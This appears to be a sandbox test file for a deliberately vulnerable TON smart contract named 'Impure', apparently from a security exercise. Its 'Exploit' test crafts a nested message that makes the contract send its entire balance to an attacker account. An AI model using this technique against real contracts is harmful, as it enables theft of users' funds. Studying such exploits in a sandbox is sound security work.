import { Blockchain, SandboxContract, TreasuryContract } from '@ton/sandbox';
import { KeyPair, getSecureRandomBytes, keyPairFromSeed, sign } from '@ton/crypto';
import { beginCell, Cell, toNano } from '@ton/core';
import { Impure } from '../wrappers/Impure';
import '@ton/test-utils';
import { compile } from '@ton/blueprint';

describe('Impure', () => {
    let code: Cell;

    beforeAll(async () => {
        code = await compile('Impure');
    });

    let blockchain: Blockchain;
    let owner1: SandboxContract<TreasuryContract>;
    let owner2: SandboxContract<TreasuryContract>;
    let exploiter: SandboxContract<TreasuryContract>;
    let impure: SandboxContract<Impure>;
    let initBalance: bigint;

    beforeEach(async () => {
        initBalance = toNano('100');
        blockchain = await Blockchain.create();

        owner1 = await blockchain.treasury('owner1');
        owner2 = await blockchain.treasury('owner2');
        exploiter = await blockchain.treasury('exploiter');

        impure = blockchain.openContract(
            Impure.createFromConfig({ owner1: owner1.address, owner2: owner2.address }, code),
        );

        const deployResult = await impure.sendDeploy(owner1.getSender(), initBalance);

        expect(deployResult.transactions).toHaveTransaction({
            from: owner1.address,
            to: impure.address,
            deploy: true,
            success: true,
        });
    });

    it('should deploy', async () => {
        expect((await impure.getOwner1()).equals(owner1.address)).toBeTruthy();
        expect((await impure.getOwner2()).equals(owner2.address)).toBeTruthy();
        expect((await impure.getBalance()) <= initBalance).toBe(true);
    });

    it('Exploit', async () => {
        expect((await impure.getBalance()) > 0n).toBe(true);

        const balanceExploiterBefore = await exploiter.getBalance();
        const body = beginCell()
            .storeRef(
                beginCell()
                    .storeRef(Cell.EMPTY)
                    .storeUint(0x0ec3c86d, 32)
                    .storeUint(128, 8)
                    .storeRef(
                        beginCell()
                            .storeUint(0x18, 6)
                            .storeAddress(exploiter.address)
                            .storeCoins(0)
                            .storeUint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
                            .endCell(),
                    ),
            )
            .endCell();

        await impure.sendMessage(exploiter.getSender(), toNano('0.05'), body);

        const balanceExploiterAfter = await exploiter.getBalance();

        expect((await impure.getBalance()) == 0n).toBe(true);
        expect(initBalance > balanceExploiterAfter - balanceExploiterBefore).toBe(true);
    });
});
